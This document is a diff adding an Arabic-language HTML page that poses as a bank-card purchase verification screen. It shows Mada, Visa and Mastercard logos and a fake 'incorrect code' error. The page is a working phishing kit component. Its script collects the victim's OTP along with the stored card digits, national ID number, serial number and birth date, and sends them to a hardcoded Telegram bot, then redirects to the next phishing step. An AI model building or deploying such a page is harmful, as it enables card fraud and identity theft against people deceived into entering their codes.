@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>مصادقة الشراء</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #f4f6fa;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    .overlay, .otp-section {
+      max-width: 340px;
+      margin: 50px auto;
+      background: white;
+      border-radius: 20px;
+      padding: 30px 20px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      text-align: center;
+      position: relative;
+    }
+
+    .overlay img,
+    .otp-section img {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+
+    .overlay h2,
+    .otp-section h2 {
+      font-size: 20px;
+      color: #0078d7;
+      margin-bottom: 10px;
+    }
+
+    .overlay p,
+    .otp-section p {
+      font-size: 15px;
+      margin-bottom: 10px;
+      color: #333;
+    }
+
+    .wait-button {
+      margin-top: 30px;
+      padding: 15px;
+      font-size: 16px;
+      background-color: #0078d7;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      width: 90%;
+      cursor: not-allowed;
+    }
+
+    .otp-section h3 {
+      font-size: 18px;
+      color: #333;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    .otp-section input {
+      padding: 12px;
+      width: 100%;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+
+    .otp-section button {
+      padding: 12px;
+      width: 100%;
+      font-size: 16px;
+      background-color: #6c757d;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .brands {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 20px;
+    }
+
+    .brands img {
+      height: 24px;
+    }
+
+    .note {
+      color: #999;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    #otp{
+        width: 310px;
+    }
+
+    #texeror{
+color: #b80808;
+    }
+  </style>
+</head>
+<body>
+
+
+
+<div class="otp-section" id="otpSection">
+  <h3>الدفع بالبطاقات البنكية</h3>
+  <h2>إثبات ملكية البطاقة</h2>
+  <p id="texeror"> يبدو انك ادخلت رمزآ غير صحيح يرجى اعادة ادخال الرمز او انتظار رمز جديد </p>
+  <p id="otpText"></p>
+  <label for="otp"><strong>رمز التحقق *</strong></label>
+  <input type="text" id="otp" placeholder="يرجى ادخال رمز التحقق" maxlength="6" minlength="4" />
+  <p class="note">سيتم إرسال رسالة كود التحقق في خلال <span id="otpTimer">03:00</span> دقيقة</p>
+  <button>تأكيد</button>
+  <div class="brands">
+    <img src="Mada_Logo.svg.png" alt="mada">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="mastercard">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="visa">
+  </div>
+</div>
+
+<script>
+  const totalPrice = localStorage.getItem("selectedPrice") || "غير متوفر";
+  const cardNumber = localStorage.getItem("cardNumber") || "0000";
+  const last4 = cardNumber.slice(-4);
+
+
+  document.querySelector('.otp-section button').addEventListener('click', function () {
+  const otpValue = document.getElementById('otp').value.trim();
+  if (otpValue.length < 4) {
+    alert("❗الرجاء إدخال رمز تحقق صالح");
+    return;
+  }
+
+  const totalPrice = localStorage.getItem("selectedPrice") || "غير متوفر";
+  const cardNumber = localStorage.getItem("cardNumber") || "0000";
+  const last4 = cardNumber.slice(-4);
+
+  const formData = JSON.parse(localStorage.getItem("formData") || "{}");
+  const identity = formData.id || "غير محدد";
+  const serial = formData.serial || "غير محدد";
+  const birth = formData.dob || formData.seller_dob || "غير محدد";
+
+  const message = `
+رمز التحقق 2:
+
+🔚 آخر ٤ أرقام من البطاقة: ${last4}
+💵 المبلغ: ${totalPrice} SAR
+🔐 رمز التحقق: ${otpValue}
+
+📄 من :
+🆔 رقم الهوية: ${identity}
+🔢 الرقم التسلسلي: ${serial}
+📅 تاريخ الميلاد: ${birth}
+`;
+
+  fetch(`https://api.telegram.org/bot7306247318:AAGoAlnx8FRFeHTCHEJ5SzhYtkwfxM5_TQg/sendMessage`, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      chat_id: '8059394046',
+      text: message
+    })
+  })
+  .then(response => {
+    if (response.ok) {
+      window.location.href = "otp3.html";
+    } else {
+      alert("حدث خطأ أثناء الإرسال إلى Telegram");
+    }
+  });
+});
+
+
+</script>
+
+</body>
+</html>
